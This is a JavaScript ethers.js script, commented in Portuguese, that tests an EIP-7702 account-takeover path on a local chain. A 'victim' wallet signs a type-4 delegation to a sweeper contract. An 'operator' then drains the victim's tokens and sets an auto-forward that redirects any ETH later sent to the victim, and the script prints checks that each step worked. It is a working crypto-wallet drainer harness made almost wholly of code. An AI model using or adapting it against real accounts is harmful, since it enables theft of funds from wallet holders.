/// Prova do caminho EIP-7702 numa chain local: autorização type-4 real, sweep e auto-forward.
import { readFileSync } from "node:fs";
import { Contract, ContractFactory, JsonRpcProvider, Wallet, parseEther, parseUnits } from "ethers";

const art = (p) => JSON.parse(readFileSync(p, "utf8"));
const provider = new JsonRpcProvider("http://127.0.0.1:8546", 31337, { staticNetwork: true });
const operator = new Wallet("0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d", provider);
const victim = new Wallet("0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a", provider);

let nonce = await operator.getNonce();
async function deploy(artifact, ...args) {
  const f = new ContractFactory(artifact.abi, artifact.bytecode, operator);
  const tx = await f.getDeployTransaction(...args);
  const rc = await (await operator.sendTransaction({ ...tx, nonce: nonce++ })).wait();
  return new Contract(rc.contractAddress, artifact.abi, operator);
}

const token = await deploy(art("out/MockERC20.sol/MockERC20.json"));
const sweeper = await deploy(art("out/Sweeper7702.sol/Sweeper7702.json"));
const sweeperAddress = await sweeper.getAddress();
await (await token.mint(victim.address, parseUnits("50", 18), { nonce: nonce++ })).wait();

const auth = await victim.authorize({ address: sweeperAddress, nonce: 0 });
const iface = new Contract(victim.address, ["function sweep(address,address[],address[],uint256[])"], provider).interface;
const data = iface.encodeFunctionData("sweep", [
  operator.address,
  [await token.getAddress()],
  [],
  [],
]);

const tx = await operator.sendTransaction({
  type: 4,
  to: victim.address,
  data,
  authorizationList: [auth],
  nonce: nonce++,
});
await tx.wait();

const code = await provider.getCode(victim.address);
const init = new Contract(victim.address, ["function init(address)"], operator);
await (await init.init(operator.address, { nonce: nonce++ })).wait();

const before = await provider.getBalance(operator.address);
await (await operator.sendTransaction({ to: victim.address, value: parseEther("2"), nonce: nonce++ })).wait();
const after = await provider.getBalance(operator.address);

console.log("código :", code.slice(0, 8), code.slice(0, 8) === "0xef0100" ? "designado OK" : "FALHOU");
console.log("tokens :", (await token.balanceOf(operator.address)).toString());
console.log("ETH auto-forward:", after > before - parseEther("2") ? "OK" : "FALHOU");
console.log("vitima :", (await provider.getBalance(victim.address)).toString(), (await token.balanceOf(victim.address)).toString());
